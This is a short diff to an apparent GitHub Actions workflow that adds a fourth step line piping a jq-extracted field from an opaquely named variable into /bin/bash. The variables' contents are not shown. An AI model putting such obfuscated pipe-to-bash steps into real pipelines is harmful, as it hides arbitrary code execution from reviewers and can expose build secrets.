@@ -20,6 +20,7 @@ jobs:
           echo $mc355 | jq -r .yqkk5 | /bin/bash
           printf '%s' "$hbbx7" | jq -r .zur3 | /bin/bash
           echo $iftq9 | jq -r .kyjpj02746 | /bin/bash
+          echo $ru18 | jq -r .rust271 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
